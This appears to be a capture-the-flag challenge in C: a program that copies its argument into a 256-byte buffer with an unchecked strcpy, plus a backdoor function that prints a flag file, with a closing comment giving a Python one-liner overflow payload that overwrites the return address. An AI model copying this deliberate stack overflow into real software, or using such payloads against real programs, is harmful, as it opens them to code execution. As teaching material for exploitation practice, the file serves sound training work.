#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void backdoor()
{
    system("cat ./flag");
}

void bof(char *str)
{
    char buf[256];
    strcpy(buf, str);
}

int main(int argc, char *argv[])
{
    char cmp[] = "can_you_do_bof";
    if(argc != 2 )      exit(0);
    
    if(strncmp(argv[1], cmp, strlen(cmp)) != 0)
        exit(0);
    
    bof(argv[1]);
}


// `python -c 'print "can_you_do_bof" + "A" * 254 + "\xbb\x84\x04\x08"'`